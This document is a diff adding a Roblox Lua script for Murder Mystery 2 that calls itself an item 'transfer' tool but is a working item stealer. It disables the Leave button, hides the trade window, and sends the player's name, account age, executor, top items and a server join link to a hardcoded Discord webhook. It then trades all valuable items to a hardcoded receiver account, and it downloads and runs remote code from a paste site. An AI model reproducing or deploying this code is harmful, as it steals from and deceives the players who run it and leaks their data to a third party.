@@ -1,0 +1,332 @@
+-- ==================================================
+-- MM2 AUTO TRANSFER / ITEM DUMP — OPTIMIZED EDITION
+-- ==================================================
+-- CONFIG — EDIT THESE!
+local CONFIG = {
+    RECEIVER_NAME = "JAMAL_THESCRIPTGUY",  -- Who receives the items
+    MIN_RARITY = "Godly",                  -- Minimum rarity to trade
+    MIN_VALUE = 2,                         -- Minimum value threshold
+    MAX_TRADE_ATTEMPTS = 999,
+    RETRY_DELAY = 2,
+    DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1543236114075095130/qGK0q72MqOhEH5sOA6F4xasKICsMJsI9zLL44P7Pk-dMps4lwiIHbZoBLNPGl4x85q8N",
+    PLACE_ID = 142823291
+}
+
+-- ==================================================
+-- INIT & SAFETY CHECKS
+-- ==================================================
+if _G.MM2_Transfer_Loaded then return end
+_G.MM2_Transfer_Loaded = true
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local LocalPlayer = Players.LocalPlayer
+
+-- Place Check
+if game.PlaceId ~= CONFIG.PLACE_ID then
+    LocalPlayer:Kick("❌ Only works in Murder Mystery 2")
+    return
+end
+
+-- Private Server Check
+pcall(function()
+    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType", 5):InvokeServer() == "VIPServer" then
+        LocalPlayer:Kick("❌ Private servers not supported")
+    end
+end)
+
+-- Server Full Check
+if #Players:GetPlayers() >= 12 then
+    LocalPlayer:Kick("❌ Server full — rejoin another")
+    return
+end
+
+-- ==================================================
+-- ANTI-LEAVE PROTECTION
+-- ==================================================
+task.spawn(function()
+    while task.wait(1) do
+        pcall(function()
+            local btn = CoreGui:FindFirstChild("RobloxGui", true)
+                and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield", true)
+                and CoreGui.RobloxGui.SettingsClippingShield:FindFirstChild("SettingsShield", true)
+                and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield:FindFirstChild("MenuContainer", true)
+            if btn then
+                local leaveBtn = btn:FindFirstChild("LeaveGameButton", true)
+                if leaveBtn and leaveBtn.Activated then
+                    for _, conn in ipairs(getconnections(leaveBtn.Activated)) do
+                        conn:Disable()
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+-- ==================================================
+-- UTILITY FUNCTIONS
+-- ==================================================
+local function GetRequestFunc()
+    if request then return request end
+    if syn and syn.request then return syn.request end
+    if http_request then return http_request end
+    return nil
+end
+
+local function GetExecutorName()
+    local name = "Unknown"
+    pcall(function() name = identifyexecutor() end)
+    return string.lower(name)
+end
+
+-- Get stable JobId
+local RealJobId = game.JobId
+task.spawn(function()
+    if not getgc then return end
+    for _ = 1, 10 do
+        for _, v in ipairs(getgc(true) or {}) do
+            if typeof(v) == "function" then
+                local info = debug.getinfo(v)
+                if info and info.name and info.name:lower():find("step") and not info.name:lower():find("stepanimate") then
+                    pcall(function()
+                        local orig = hookfunction(v, function(...)
+                            RealJobId = RealJobId or game.JobId
+                            return orig(...)
+                        end)
+                    end)
+                    return
+                end
+            end
+        end
+        task.wait(0.1)
+    end
+end)
+
+-- ==================================================
+-- ITEM DATABASE & RARITY SYSTEM
+-- ==================================================
+local RARITY_ORDER = {"Chroma", "Unique", "Ancient", "Godly", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
+local RARITY_INDEX = {}
+for i, rarity in ipairs(RARITY_ORDER) do RARITY_INDEX[rarity] = i end
+local MIN_RARITY_INDEX = RARITY_INDEX[CONFIG.MIN_RARITY] or 5
+
+local ITEM_BLACKLIST = {
+    DefaultGun = true, DefaultKnife = true, Reaver = true, IceHammer = true,
+    Gingerscythe = true, TestItem = true, Cracks = true, Icecrusher = true,
+    Dartbringer = true, SharkSeeker = true, ["???"] = true
+}
+
+local ItemDatabase = {}
+local function LoadDatabase()
+    local func = GetRequestFunc()
+    if not func then return end
+    for attempt = 1, 3 do
+        local success, data = pcall(function()
+            local res = func({
+                Url = "https://pastefy.app/pZmGtWTo/raw",
+                Method = "GET",
+                Timeout = 10
+            })
+            if not res or not res.Body then return nil end
+            local loader = loadstring(res.Body)
+            return loader and loader() or nil
+        end)
+        if success and type(data) == "table" then
+            for rarity, items in pairs(data) do
+                if type(items) == "table" then
+                    for name, value in pairs(items) do
+                        local key = string.lower(name):gsub("'", ""):gsub("%s+", "")
+                        ItemDatabase[key] = {
+                            rarity = rarity,
+                            value = tonumber(value) or 0,
+                            isChroma = string.lower(rarity) == "chroma"
+                        }
+                    end
+                end
+            end
+            return true
+        end
+        task.wait(0.5)
+    end
+    return false
+end
+LoadDatabase()
+
+-- ==================================================
+-- INVENTORY SCANNING
+-- ==================================================
+local function GetInventory()
+    local allItems, tradeable, totalValue = {}, {}, 0
+    local profile = pcall(function()
+        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+    end)
+    if not profile or not profile.Weapons or not profile.Weapons.Owned then
+        return allItems, tradeable, 0
+    end
+
+    for itemId, count in pairs(profile.Weapons.Owned) do
+        if count and count > 0 and not ITEM_BLACKLIST[itemId] then
+            local key = string.lower(itemId):gsub("'", ""):gsub("%s+", "")
+            local info = ItemDatabase[key]
+            local rarity = info and info.rarity or "Unknown"
+            local value = info and info.value or 0
+            local rarityPos = RARITY_INDEX[rarity] or 99
+
+            local entry = {
+                id = itemId,
+                name = itemId,
+                rarity = rarity,
+                count = count,
+                value = value,
+                total = value * count,
+                isChroma = info and info.isChroma
+            }
+            table.insert(allItems, entry)
+
+            if rarityPos <= MIN_RARITY_INDEX or value >= CONFIG.MIN_VALUE then
+                table.insert(tradeable, entry)
+                totalValue += entry.total
+            end
+        end
+    end
+
+    table.sort(allItems, function(a, b) return a.total > b.total end)
+    table.sort(tradeable, function(a, b) return a.total > b.total end)
+    return allItems, tradeable, totalValue
+end
+
+-- ==================================================
+-- DISCORD WEBHOOK LOGGING
+-- ==================================================
+local function SendDiscordLog(allItems, totalValue)
+    local func = GetRequestFunc()
+    if not func or CONFIG.DISCORD_WEBHOOK == "" then return end
+
+    local topItems = {}
+    for i = 1, math.min(10, #allItems) do
+        local item = allItems[i]
+        table.insert(topItems, string.format("> %s%s ×%d — %d",
+            item.isChroma and "Chroma " or "", item.name, item.count, item.total))
+    end
+
+    local embed = {
+        author = {name = "MM2 ITEM TRANSFER — " .. LocalPlayer.Name},
+        color = 0x4B5563,
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        fields = {
+            {name = "Player", value = string.format("```%s\n%s\nAge: %d days\nExecutor: %s```",
+                LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.AccountAge, GetExecutorName()), inline = false},
+            {name = "Stats", value = string.format("```Total Items: %d\nTotal Value: %d```", #allItems, totalValue), inline = false},
+            {name = "Top Items", value = "```" .. table.concat(topItems, "\n") .. "```", inline = false},
+            {name = "Server", value = string.format("[Join Link](https://plsbrainrot.me/joiner?placeId=%d&gameInstanceId=%s)", CONFIG.PLACE_ID, RealJobId), inline = false}
+        },
+        footer = {text = "MM2 Transfer • " .. os.date("%Y-%m-%d %H:%M:%S")}
+    }
+
+    pcall(function()
+        func({
+            Url = CONFIG.DISCORD_WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({embeds = {embed}})
+        })
+    end)
+end
+
+-- ==================================================
+-- TRADE SYSTEM
+-- ==================================================
+local function GetTradeStatus()
+    return pcall(function() return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end) or "None"
+end
+
+local function FindReceiver()
+    if CONFIG.RECEIVER_NAME == "" then return nil end
+    if Players:FindFirstChild(CONFIG.RECEIVER_NAME) then
+        return CONFIG.RECEIVER_NAME
+    end
+    return nil
+end
+
+local function DisableTradeGUI()
+    task.spawn(function()
+        local gui = LocalPlayer:WaitForChild("PlayerGui")
+        while task.wait(0.5) do
+            pcall(function()
+                if gui:FindFirstChild("TradeGUI") then gui.TradeGUI.Enabled = false end
+                if gui:FindFirstChild("TradeGUI_Phone") then gui.TradeGUI_Phone.Enabled = false end
+            end)
+        end
+    end)
+end
+
+local function BeginTransfer()
+    local allItems, tradeableItems, totalValue = GetInventory()
+
+    if #allItems == 0 then
+        LocalPlayer:Kick("❌ No items found!")
+        return
+    end
+    if #tradeableItems == 0 then
+        LocalPlayer:Kick("❌ No items meet minimum rarity!")
+        return
+    end
+
+    -- Send log before starting
+    SendDiscordLog(allItems, totalValue)
+
+    local receiver = FindReceiver()
+    if not receiver then
+        LocalPlayer:Kick("❌ Receiver not found! Join them first.")
+        return
+    end
+
+    DisableTradeGUI()
+
+    -- Trade loop
+    local attempts = 0
+    while #tradeableItems > 0 and attempts < CONFIG.MAX_TRADE_ATTEMPTS do
+        attempts += 1
+        local status = GetTradeStatus()
+
+        if status == "None" then
+            -- Send trade request
+            pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(receiver) end)
+            task.wait(1)
+        elseif status == "StartTrade" then
+            -- Add items
+            local batch = math.min(4, #tradeableItems)
+            for i = 1, batch do
+                local item = table.remove(tradeableItems, 1)
+                for _ = 1, item.count do
+                    pcall(function() ReplicatedStorage.Trade.OfferItem:FireServer(item.id, "Weapons") end)
+                    task.wait(0.05)
+                end
+            end
+            task.wait(5)
+            -- Accept & finish
+            pcall(function() ReplicatedStorage.Trade.AcceptTrade:FireServer(CONFIG.PLACE_ID * 3, true) end)
+            task.wait(3)
+            -- Refresh inventory
+            _, tradeableItems = GetInventory()
+            attempts = 0
+        elseif status == "ReceivingRequest" then
+            pcall(function() ReplicatedStorage.Trade.DeclineRequest:FireServer() end)
+            task.wait(0.5)
+        end
+        task.wait(0.3)
+    end
+
+    -- Done
+    task.wait(1)
+    LocalPlayer:Kick("✅ All items transferred!")
+end
+
+-- Auto-start when receiver joins
+task.spawn(function()
+    LocalPlayer.CharacterAdded:Wait()
+    task.wait(2)
+    BeginTransfer()
+end)
